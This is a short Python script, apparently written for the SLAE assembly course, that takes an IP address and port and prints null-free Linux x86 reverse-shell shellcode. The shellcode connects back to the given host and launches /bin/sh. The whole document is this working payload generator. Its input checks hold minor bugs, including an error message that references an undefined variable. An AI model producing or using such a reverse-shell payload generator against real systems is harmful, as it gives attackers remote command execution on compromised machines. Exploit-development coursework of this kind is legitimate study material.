# Author: RawrRadioMouse
# Purpose: SLAE


#!/usr/bin/python

import sys
import binascii
import socket

if len(sys.argv) <= 2:
	print ('Usage: wrapper.py <ip> <port>') #let user know that script requires an arg
	exit()
ip = (sys.argv[1])
if len(ip.split(".")) < 4:
	print ("[!] {} not a valid IP, c'mon!").format(port) #tell em off
	sys.exit()
port = int(sys.argv[2])
if (port < 1024 or port > 65535):
	print ("[!] {} not a valid port, must be between 0-65535!").format(port) #tell people off for being silly
	exit()
ip = (sys.argv[1])
port = hex(port)[2:] # convert port val to hex, and slice out the preceeding "0x" before the hex output
port = '\\x'+str(port[0:2]) + '\\x'+str(port[2:4]) # further break up hex output and place our "\\x" in front of each hex val	
ip = socket.inet_aton(ip).hex() #use socket module to convert IP to hex
ip = '\\x'+str(ip[0:2]) + '\\x'+str(ip[2:4]) + '\\x'+str(ip[4:6]) + '\\x'+str(ip[6:8]) #break it into same format as port
print("IP is: "+ ip)
print("Port is: "+ port)
shellcode = ""
shellcode += "\\x31\\xc0\\x50\\x6a\\x01\\x6a\\x02\\x31\\xc9\\x89\\xe1\\xb0"
shellcode += "\\x66\\xb3\\x01\\xcd\\x80\\x89\\xc6\\x89\\xc3\\x31\\xc9\\xb0"
shellcode += "\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x04\\x75\\xf6\\x31\\xc9\\xb9"
shellcode += ip
shellcode += "\\x81\\xe9\\x01\\x01\\x01\\x01\\x51\\x66\\x68"
shellcode += port
shellcode += "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xb3"
shellcode += "\\x03\\x31\\xc0\\xb0\\x66\\xcd\\x80\\x31\\xc0\\x50\\x68\\x6e"
shellcode += "\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89"
shellcode += "\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
print(shellcode)

